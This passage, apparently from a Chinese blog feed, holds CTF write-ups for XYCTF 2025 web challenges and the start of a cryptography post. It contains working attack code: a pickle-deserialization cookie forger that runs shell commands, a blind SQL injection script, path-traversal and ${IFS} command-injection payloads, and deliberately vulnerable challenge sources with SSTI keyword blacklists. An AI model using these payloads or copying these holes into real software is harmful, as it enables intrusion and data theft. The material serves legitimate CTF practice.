request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>这里绕过读取文件的限制，<code>./../</code>相当于<code>../</code>，意义为<strong>先进入当前目录（其实就是留在原地），然后再退到上一级目录</strong></p><p><code>/download?filename=./.././.././../secret.txt</code>得到<code>Hell0_H@cker_Y0u_A3r_Sm@r7</code></p><p>下面跟<a href="https://www.cjxol.com/posts/sekaictf-2022-writeup/">Bottle Poem</a>大致一样，<code>pickle反序列化+cookie签名</code>，不过这里<code>cookie</code>的签名用的不再是<code>md5</code>而是<code>sha256</code>，应该是出于安全性考虑</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_cookie</span>(<span class="params">payload</span>):</span><br><span class="line">    b64pld = base64.b64encode(payload)</span><br><span class="line">    signature = base64.b64encode(</span><br><span class="line">        hmac.new(</span><br><span class="line">            <span class="string">b&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>, b64pld, hashlib.sha256</span><br><span class="line">        ).digest()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&quot;!&#x27;</span> + signature + <span class="string">b&quot;?&quot;</span> + b64pld + <span class="string">b&#x27;&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /flag_* &gt; flag&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(gen_cookie(data).decode())</span><br></pre></td></tr></table></figure><p>然后通过<code>/download?filename=flag</code>路由进行下载即可<br /><code>XYCTF&#123;We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!&#125;</code></p><h2 id="ezsql手动滑稽"><a class="markdownIt-Anchor" href="#ezsql手动滑稽"></a> ezsql(手动滑稽)</h2><blockquote><p>简单sql(手动滑稽)，不需要sqlmap等自动化工具，请手工哟∧_∧</p></blockquote><p><code>username</code>单引号注入报错，确定为注入点，也可以看出是<code>sqlite</code></p><p><code>fuzz</code>一下发现<strong>空格</strong>、<strong>±*|</strong>、<strong>换行符</strong>、<strong>逗号</strong>，<strong>union</strong>等被过滤了<br />找到<a href="https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md">绕过参考</a><br />先试试<strong>万能密码</strong>能不能直接登陆，发现是可以的<br /><img src="https://pic1.zhimg.com/80/v2-5f9a7fd715f0bf17e95307805b462dc1_1440w.png" alt="" /><br />这里尝试<strong>盲注</strong>能不能注出<strong>秘钥</strong></p><p><strong>空格</strong>可以用<code>%09</code>即<code>tap</code>代替，<strong>逗号</strong>用<code>from for</code></p><p>改一下以前的<strong>布尔盲注</strong>脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;xxx/login.php&#x27;</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr(database() from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># testdb</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># double_check,user</span></span><br><span class="line">        <span class="comment"># payload = f&quot;1&#x27; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;double_check&#x27;) from &#123;i&#125; for &#123;i&#125;)) &gt; &#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment"># secret</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; or ascii(substr((select group_concat(secret) from double_check) from <span class="subst">&#123;i&#125;</span> for <span class="subst">&#123;i&#125;</span>)) &gt; <span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">        <span class="comment"># dtfrtkcc0czkoua9S</span></span><br><span class="line">        <span class="comment"># param = &quot;id&quot; + payload</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: payload.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\t&quot;</span>),</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">        <span class="comment"># r = requests.get(url, params=param)</span></span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;帐号或密码错误&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">1</span>:</span><br><span class="line">        text += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>输入秘钥后，告诉我们<strong>命令执行无回显</strong>，又过滤了<strong>空格</strong>，简单，直接重定向<br /><code>command=cat$&#123;IFS&#125;/flag.txt$&#123;IFS&#125;&gt;1.txt</code></p><h2 id="ez_puzzle"><a class="markdownIt-Anchor" href="#ez_puzzle"></a> ez_puzzle</h2><blockquote><p>你能在两秒之内完成拼图吗？</p></blockquote><p>可以搜索前端<code>js</code>脚本，因为本题的关键肯定是在时间，所以搜一下<code>time</code>，发现了<code>startTime endTime</code></p><p>完成拼图后通过侧边栏进入<strong>开发者工具</strong>，正常来说花费的时间应该是<code>endTime-startTime</code>，控制台只能查看<code>startTime</code>，说明我们只能通过完成拼图那一刻才能得到<code>endTime</code>，也就是前端页面的<strong>实时时间</strong></p><p>所以我们可以在控制台输入<code>startTime=Date.now()</code>，从而使花费的时间为0<br /><img src="https://picx.zhimg.com/80/v2-9ed42b3fccc199b8c329f4f661b7b195_1440w.png" alt="" /><br /><img src="https://pic1.zhimg.com/80/v2-0a972282b09fa1c6c3978d67517524ae_1440w.png" alt="" /><br /><code>flag&#123;Y0u__aRe_a_mAsteR_of_PUzZL!!@!!~!&#125;</code></p><h2 id="fate"><a class="markdownIt-Anchor" href="#fate"></a> fate*</h2><blockquote><p>一生中能改变命运的机会可不多啊。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">blacklist = string.ascii_letters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> string_output</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nolettersproxy</span>():</span><br><span class="line">    url = flask.request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>, <span class="string">&#x27;No URL provided&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">&quot;http://lamentxu.top&quot;</span> + url</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;No ssrf allowed&#x27;</span>)</span><br><span class="line">    response = requests.get(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.Response(response.content, response.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(flask.request.remote_addr)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/1337&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_search</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        code = flask.request.args.get(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">&#x27;abcdefghi&#x27;</span>:</span><br><span class="line">            req = flask.request.args.get(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                req = binary_to_string(req)</span><br><span class="line">                <span class="built_in">print</span>(req)</span><br><span class="line">                req = json.loads(req) <span class="comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid JSON&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Empty Person&#x27;s name&quot;</span>)</span><br><span class="line"></span><br><span class="line">            name = req[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">6</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Too long&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO &#x27;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;)&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO )&quot;</span>)</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Some waf hidden here ;)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            fate = db_search(name)</span><br><span class="line">            <span class="keyword">if</span> fate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flask.abort(<span class="number">404</span>, <span class="string">&quot;No such Person&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;Fate&#x27;</span>: fate&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flask.abort(<span class="number">400</span>, <span class="string">&quot;Hello local, and hello hacker&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Only local access allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="now-you-see-me-1"><a class="markdownIt-Anchor" href="#now-you-see-me-1"></a> Now you see me 1*</h2><blockquote><p><code>&#123;%print("Welcome the four horsemen tonight!")%&#125;</code></p></blockquote><p>先解<code>base64</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:10:37</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>, </span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>, </span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, </span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>, </span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>, </span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>, </span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> , </span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>] </span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h2 id="now-you-see-me-2"><a class="markdownIt-Anchor" href="#now-you-see-me-2"></a> Now you see me 2*</h2><blockquote><p><code>&#123;%print("We are the four horsemen.")%&#125; 压缩包密码为“Now you see me 1”的flag</code></p></blockquote><h2 id="出题人已疯"><a class="markdownIt-Anchor" href="#出题人已疯"></a> 出题人已疯*</h2><blockquote><p>出题人已疯，你知道出题人为什么疯吗</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="string">&#x27;open&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">and</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">出题人</a></p><h2 id="出题人又疯"><a class="markdownIt-Anchor" href="#出题人又疯"></a> 出题人又疯*</h2><blockquote><p>出题人又疯了，你知道这次出题人为什么疯吗？<br />（附件密码是“出题人已疯的flag”）</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;*&lt;strong&gt;代表未解决，可能是卡了，也可能是没思路了，简单做个记录，然后跑了，再或者是后续没来得及复现，在此处留个坑，等以后回来填上……&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gz.imxbt.cn/games/23&quot;&gt;复现网址&lt;/a&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cryptography趣题记录</title>
    <link href="https://hvang10.github.io/2025/04/03/%E5%AF%86%E7%A0%81%E8%B6%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/04/03/%E5%AF%86%E7%A0%81%E8%B6%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2025-04-03T06:35:29.000Z</published>
    <updated>2025-08-05T17:32:01.066Z</updated>
    
    <content type="html"><![CDATA[<p>这里也记录一下，各种比赛零零散散的题目(觉得比较有意思的)</p><h1 id="kalmarctf2025-basic-sums"><a class="markdownIt-Anchor" href="#kalmarctf2025-basic-sums"></a> KalmarCTF2025 - basic sums</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># I found this super cool function on stack overflow \o/ https://stackoverflow.com/questions/2267362/how-to-convert-an-integer-to-a-string-in-any-base</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">numberToBase</span>(<span class="params">n, b</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>]</span><br><span class="line">    digits = []</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        digits.append(<span class="built_in">int</span>(n % b))</span><br><span class="line">        n //= b</span><br><span class="line">    <span class="keyword">return</span> digits[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">45</span></span><br><span class="line"></span><br><span class="line">flag = 